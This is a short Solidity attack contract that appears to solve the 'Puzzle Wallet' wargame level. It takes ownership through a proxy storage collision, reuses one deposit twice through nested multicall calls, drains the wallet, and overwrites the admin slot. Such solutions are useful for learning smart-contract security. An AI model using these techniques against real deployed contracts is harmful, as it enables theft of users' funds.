// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "./PuzzleWallet.sol";

contract PuzzleAttack {
    PuzzleWallet public wallet;
    PuzzleProxy public proxy;

    constructor(address payable _proxy) public {
        wallet = PuzzleWallet(_proxy);
        proxy = PuzzleProxy(_proxy);
    }

    function attack() public payable {
        proxy.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));
        bytes memory deposit_sig = abi.encodeWithSignature("deposit()");
        bytes[] memory deposit_sig_in_array = new bytes[](1);
        deposit_sig_in_array[0] = deposit_sig;
        bytes memory multicall_sig = abi.encodeWithSignature(
            "multicall(bytes[])",
            deposit_sig_in_array
        );
        // bytes[] memory data = [deposit_sig, multicall_sig];
        bytes[] memory data = new bytes[](2);
        data[0] = deposit_sig;
        data[1] = multicall_sig;
        wallet.multicall{value: address(this).balance}(data);
        bytes memory transfer_sig = abi.encodeWithSignature(
            "transfer(int)",
            address(wallet).balance
        );
        wallet.execute(msg.sender, address(wallet).balance, transfer_sig);
        wallet.setMaxBalance(uint256(msg.sender));
    }
}
